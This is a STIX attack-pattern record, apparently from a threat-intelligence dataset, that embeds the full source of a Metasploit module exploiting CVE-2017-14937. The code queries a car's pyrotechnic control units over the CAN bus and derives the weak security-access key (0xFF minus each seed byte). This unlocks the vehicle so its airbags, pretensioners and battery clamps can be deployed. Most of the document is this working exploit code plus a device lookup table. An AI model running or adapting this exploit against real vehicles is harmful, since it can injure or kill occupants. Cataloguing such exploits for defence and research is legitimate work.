{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--67d04848-f0b3-4712-972a-2f484e58aa74",
    "created": "2024-08-14T16:32:59.449639Z",
    "modified": "2024-08-14T16:32:59.449643Z",
    "name": "Check For and Prep the Pyrotechnic Devices (Airbags, Battery Clamps, etc.)",
    "description": " Acting in the role of a Pyrotechnical Device Deployment Tool (PDT), this module will first query all Pyrotechnic Control Units (PCUs) in the target vehicle to discover how many pyrotechnic devices are present, then attempt to validate the security access token using the default simplified algorithm.  On success the vehicle will be in a state that is prepped to deploy its pyrotechnic devices (e.g. airbags, battery clamps, etc.) via the service routine. (ISO 26021)  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/hardware/automotive/pdt.rb",
            "external_id": "pdt.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-14937"
        },
        {
            "source_name": "reference",
            "url": "https://www.researchgate.net/publication/321183727_Security_Evaluation_of_an_Airbag-ECU_by_Reusing_Threat_Modeling_Artefacts"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex'\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Post::Hardware::Automotive::UDS\n  include Msf::Post::Hardware::Automotive::DTC\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Check For and Prep the Pyrotechnic Devices (Airbags, Battery Clamps, etc.)',\n        'Description' => %q{\n          Acting in the role of a Pyrotechnical Device Deployment Tool (PDT), this module\n          will first query all Pyrotechnic Control Units (PCUs) in the target vehicle\n          to discover how many pyrotechnic devices are present, then attempt to validate\n          the security access token using the default simplified algorithm.  On success,\n          the vehicle will be in a state that is prepped to deploy its pyrotechnic devices\n          (e.g. airbags, battery clamps, etc.) via the service routine. (ISO 26021)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Johannes Braun',    # original research\n          'Juergen Duerrwang', # original research\n          'Craig Smith'        # research and module author\n        ],\n        'References' => [\n          [ 'CVE', '2017-14937' ],\n          [ 'URL', 'https://www.researchgate.net/publication/321183727_Security_Evaluation_of_an_Airbag-ECU_by_Reusing_Threat_Modeling_Artefacts' ]\n        ],\n        'Platform' => ['hardware'],\n        'SessionTypes' => ['hwbridge']\n      )\n    )\n    register_options([\n      OptInt.new('SRCID', [true, 'Module ID to query', 0x7f1]),\n      OptInt.new('DSTID', [false, 'Expected reponse ID, defaults to SRCID + 8', 0x7f9]),\n      OptInt.new('PADDING', [false, 'Pad the packet with extra bytes to always be 8 bytes long', 0x00]),\n      OptString.new('CANBUS', [false, 'CAN Bus to perform scan on, defaults to connected bus', nil])\n    ])\n  end\n\n  LOOP_TABLE = {\n    0x00 => 'ISOSAEReserved',\n    0x01 => 'airbag driver side frontal 1st stage',\n    0x02 => 'airbag left side frontal 1st stage',\n    0x03 => 'airbag right side frontal 1st stage',\n    0x04 => 'airbag driver side frontal 2nd stage',\n    0x05 => 'airbag left side frontal 2nd stage',\n    0x06 => 'airbag right side frontal 2nd stage',\n    0x07 => 'airbag driver side frontal 3rd stage',\n    0x08 => 'airbag left side frontal 3rd stage',\n    0x09 => 'airbag right side frontal 3rd stage',\n    0x0A => 'airbag passenger side frontal 1st stage',\n    0x0B => 'airbag passenger side frontal 2nd stage',\n    0x0C => 'airbag passenger side frontal 3rd stage',\n    0x0D => 'airbag left side frontal 3rd stage',\n    0x0E => 'airbag right side frontal 3rd stage',\n    0x0F => 'airbag passenger frontal 1st stage - center',\n    0x10 => 'airbag passenger frontal 2nd stage - center',\n    0x11 => 'airbag passenger frontal 3rd stage - center',\n    0x12 => '1st pretensioner driver side',\n    0x13 => '1st pretensioner left side',\n    0x14 => '1st pretensioner right side',\n    0x15 => '2nd pretensioner driver side',\n    0x16 => '2nd pretensioner left side',\n    0x17 => '2nd pretensioner right side',\n    0x18 => '1st pretensioner passenger side',\n    0x19 => '2nd pretensioner passenger side',\n    0x1A => '1st pretensioner passenger - center',\n    0x1B => '2nd pretensioner passenger - center',\n    0x1C => '1st pretensioner (2nd row) left',\n    0x1D => '2nd pretensioner (2nd row) left',\n    0x1E => '1st pretensioner (2nd row) right',\n    0x1F => '2nd pretensioner (2nd row) right',\n    0x20 => '1st pretensioner (2nd row) center',\n    0x21 => '2nd pretensioner (2nd row) center',\n    0x22 => '1st pretensioner (3rd row) left',\n    0x23 => '2nd pretensioner (3rd row) left',\n    0x24 => '1st pretensioner (3rd row) right',\n    0x25 => '2nd pretensioner (3rd row) right',\n    0x26 => '1st pretensioner (3rd row) center',\n    0x27 => '2nd pretensioner (3rd row) center',\n    0x28 => 'belt force limiter driver side',\n    0x29 => 'belt force limiter left side',\n    0x2A => 'belt force limiter right side',\n    0x2B => 'belt force limiter passenger side',\n    0x2C => 'belt force limiter passenger side - center',\n    0x2D => 'belt force limiter 2nd row - left',\n    0x2E => 'belt force limiter 2nd row - right',\n    0x2F => 'belt force limiter 2nd row - center',\n    0x30 => 'belt force limiter 3rd row - left',\n    0x31 => 'belt force limiter 3rd row - right',\n    0x32 => 'belt force limiter 3rd row - center',\n    0x33 => 'headbag - driver side (roof mounted)',\n    0x34 => 'headbag - passenger side (roof mounted)',\n    0x35 => 'headbag - right side (roof mounted)',\n    0x36 => 'headbag - left side (roof mounted)',\n    0x37 => 'headbag - 2nd row - left (roof mounted)',\n    0x38 => 'headbag - 2nd row - right (roof mounted)',\n    0x39 => 'headbag - 3rd row - left (roof mounted)',\n    0x3A => 'headbag - 3rd row - right (roof mounted)',\n    0x3B => 'sidebag (curtain) - driver side',\n    0x3C => 'sidebag (curtain) - passenger side',\n    0x3D => 'sidebag (curtain) - left side',\n    0x3E => 'sidebag (curtain) - right side',\n    0x3F => 'sidebag (curtain) - 2nd row - left',\n    0x40 => 'sidebag (curtain) - 2nd row - right',\n    0x41 => 'sidebag (curtain) - 3rd row - left',\n    0x42 => 'sidebag (curtain) - 3rd row - right',\n    0x43 => 'sidebag - driver side (door mounted)',\n    0x44 => 'sidebag - passenger side (door mounted)',\n    0x45 => 'sidebag - left side (door mounted)',\n    0x46 => 'sidebag - right side (door mounted)',\n    0x47 => 'sidebag - 2nd row - left (door mounted)',\n    0x48 => 'sidebag - 2nd row - right (door mounted)',\n    0x49 => 'sidebag - 3rd row - left (door mounted)',\n    0x4A => 'sidebag - 3rd row - right (door mounted)',\n    0x4B => 'seatbag (cushion) - driver side (seat mounted)',\n    0x4C => 'seatbag (cushion) - passenger side (seat mounted)',\n    0x4D => 'seatbag (cushion) - left side (seat mounted)',\n    0x4E => 'seatbag (cushion) - right side (seat mounted)',\n    0x4F => 'seatbag (cushion) - 2nd row - left (seat mounted)',\n    0x50 => 'seatbag (cushion) - 2nd row - right (seat mounted)',\n    0x51 => 'seatbag (cushion) - 3rd row - left (seat mounted)',\n    0x52 => 'seatbag (cushion) - 3rd row - right (seat mounted)',\n    0x53 => 'kneebag - driver side',\n    0x54 => 'kneebag - passenger side',\n    0x55 => 'kneebag - left side',\n    0x56 => 'kneebag - right side',\n    0x57 => 'kneebag - passenger side - center',\n    0x58 => 'footbag - driver side',\n    0x59 => 'footbag - passenger side',\n    0x5A => 'footbag - left side',\n    0x5B => 'footbag - right side',\n    0x5C => 'footbag - passenger side - center',\n    0x5E => 'active headrest - driver side',\n    0x5F => 'active headrest - passenger side',\n    0x60 => 'active headrest - left side',\n    0x61 => 'active headrest - right side',\n    0x62 => 'active headrest - passenger side - center',\n    0x63 => 'active headrest - 2nd row - left',\n    0x64 => 'active headrest - 2nd row - right',\n    0x65 => 'active headrest - 2nd row - center',\n    0x66 => 'active headrest - 3rd row - left',\n    0x67 => 'active headrest - 3rd row - right',\n    0x68 => 'active headrest - 3rd row - center',\n    0x69 => 'battery clamp main battery',\n    0x6A => 'battery clamp 2nd battery',\n    0x6B => 'battery clamp 3rd battery',\n    0x6C => 'battery clamp 4th battery',\n    0x6D => 'roof-airbag front',\n    0x6E => 'roof-airbag front',\n    0x6F => 'bag in belt driver side',\n    0x70 => 'bag in belt passenger side',\n    0x71 => 'bag in belt left side',\n    0x72 => 'bag in belt right side',\n    0x73 => 'bag in belt passenger side - center',\n    0x74 => 'bag in belt 2nd row - left',\n    0x75 => 'bag in belt 2nd row - right',\n    0x76 => 'bag in belt 2nd row - center',\n    0x77 => 'bag in belt 3rd row - left',\n    0x78 => 'bag in belt 3rd row - right',\n    0x79 => 'bag in belt 3rd row - center',\n    0x7A => 'rollover bar #1',\n    0x7B => 'rollover bar #2',\n    0x7C => 'rollover bar #3',\n    0x7D => 'rollover bar #4',\n    0x7E => 'active anti-submarining driver seat',\n    0x7F => 'active anti-submarining passenger seat',\n    0x80 => 'active anti-submarining left seat',\n    0x81 => 'active anti-submarining right seat',\n    0x82 => 'active anti-submarining passenger seat - center',\n    0x83 => 'active anti-submarining seat 2nd row - left',\n    0x84 => 'active anti-submarining seat 2nd row - right',\n    0x85 => 'active anti-submarining seat 2nd row - center',\n    0x86 => 'active anti-submarining seat 3rd row - left',\n    0x87 => 'active anti-submarining seat 3rd row - right',\n    0x88 => 'active anti-submarining seat 3rd row - center',\n    0x89 => 'pedestrian protection front left hood lifter',\n    0x8A => 'pedestrian protection front right hood lifter',\n    0x8B => 'pedestrian protection rear left hood lifter',\n    0x8C => 'pedestrian protection rear right hood lifter',\n    0x8D => 'pedestrian protection a-pillar left',\n    0x8E => 'pedestrian protection a-pillar right',\n    0x8F => 'pedestrian protection wind screen',\n    0x90 => 'pedestrian protection bumper left',\n    0x91 => 'pedestrian protection bumper center',\n    0x92 => 'pedestrian protection bumper right',\n    0x93 => 'active steering column',\n    0x94 => 'front screen - emergency release',\n    0x95 => 'read window - emergency release'\n  }\n\n  ACL_TYPES = {\n    0x01 => 'CAN only',\n    0x02 => 'ACL Comm Mode 12V',\n    0x03 => 'ACL PWM FixedLevel 8V',\n    0x04 => 'ACL Comm Mode 24V',\n    0x05 => 'ACL PWM UbattLevel 12V',\n    0x06 => 'ACL PWM UbattLevel 24V'\n  }\n\n  PCU_ADDRESS_FORMAT = {\n    0x01 => '11 bit normal addressing',\n    0x02 => '11 bit extended addressing',\n    0x03 => '11 bit mixed addressing',\n    0x04 => '29 bit normal fixed addressing',\n    0x05 => '29 bit mixed addressing',\n    0x06 => '29 bit unique addressing'\n  }\n\n  def print_vin(vin)\n    return '' if vin.nil?\n\n    vin.map! { |d| d.hex.chr }\n    print_status(\" VIN: #{vin.join}\")\n  end\n\n  def print_loop_table(loopid)\n    print_status(\"Loop info (#{loopid[2].hex} pyrotechnic devices):\")\n    (3..loopid.size).each do |i|\n      if i % 2 == 1\n        if loopid[i] && (LOOP_TABLE.key? loopid[i].hex)\n          print_status(\"  #{loopid[i]} | #{LOOP_TABLE[loopid[i].hex]}\")\n        else\n          print_status(\"  #{loopid[i]} | <<UNKNOWN>>\")\n        end\n      elsif loopid[i] && loopid[i].hex == 0\n        print_status('     |  Deployment Status: Good')\n      else\n        print_status(\"     |  Deployment Status: Fail (#{loopid[i]})\")\n      end\n    end\n  end\n\n  def run\n    opt = {}\n    opt['PADDING'] = datastore['PADDING'] unless datastore['PADDING'].nil?\n    print_status('Gathering Data...')\n    vin = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xF1, 0x90], opt)\n    no_of_pcus = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xFA, 0x00], opt)\n    no_of_iso_version = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xFA, 0x01], opt)\n    address_format = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xFA, 0x02], opt)\n    loopid = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xFA, 0x06], opt)\n    acl_type_definition = loopid[0]\n    acl_type_version = loopid[1]\n    no_of_charges = loopid[2]\n\n    print_vin(vin)\n    print_loop_table(loopid)\n    print_status(\" Number of PCUs in vehicle     | #{no_of_pcus[0].hex}\")\n    print_status(' Info About First PCU')\n    print_status(\" Address format this PCU(s)    | #{PCU_ADDRESS_FORMAT[address_format[0].hex]}\")\n    print_status(\" Number of pyrotechnic charges | #{no_of_charges.hex}\")\n    print_status(\" Version of ISO26021 standard  | #{no_of_iso_version[0].hex}\")\n    print_status(\" ACL type                      | #{ACL_TYPES[acl_type_definition.hex]}\")\n    print_status(\" ACL Type version              | #{acl_type_version.hex}\")\n    print_status\n    print_status('Switching to Diagnostic Session 0x04...')\n    resp = set_dsc(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], 0x04, opt)\n    if resp.key? 'error'\n      print_error(\"Could not switch to DSC 0x04: #{resp['error']}\")\n      return\n    end\n    # We may not need tester present at all because we will perform the action quickly\n    send_tester_present(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], opt)\n    print_status('Getting Security Access Seed...')\n    seed = get_security_token(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], 0x5F, opt)\n    if seed.key? 'error'\n      print_error(\"Couldn't get seed: #{seed['error']}\")\n      return\n    end\n    print_status(\"Success.  Seed: #{seed['SEED']}\")\n    print_status('Attempting to unlock device...')\n    display_warning = false\n    if seed['SEED'][0].hex == 0 && seed['SEED'][1].hex == 0\n      print_status('Security Access Already Unlocked!!')\n      display_warning = true\n    else\n      key = [0xFF - seed['SEED'][0].hex, 0xFF - seed['SEED'][1].hex]\n      resp = send_security_token_response(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], key, 0x60, opt)\n      if (resp.key? 'error') && !(resp['error'].key? 'RCRRP')\n        print_error(\"Invalid SA Response.  System not vulnerable. Error: #{resp['error']}\")\n        return\n      end\n      found_valid = false\n      if (resp.key? 'Packets') && !resp['Packets'].empty?\n        resp['Packets'].each do |i|\n          found_valid = true if (i.key? 'DATA') && i['DATA'].size > 1 && i['DATA'][1] == '67'\n        end\n      end\n      if found_valid\n        print_status('Success!')\n        display_warning = true\n      else\n        print_error(\"Unknown response: #{resp.inspect}\")\n      end\n    end\n    if display_warning\n      print_warning('Warning! You are now able to start the deployment of airbags in this vehicle')\n      print_warning('*** OCCUPANTS OF THE VEHICLE FACE POTENTIAL DEATH OR INJURY ***')\n    end\n  end\n\nend\n",
    "x_mitre_platforms": [
        "['hardware']"
    ]
}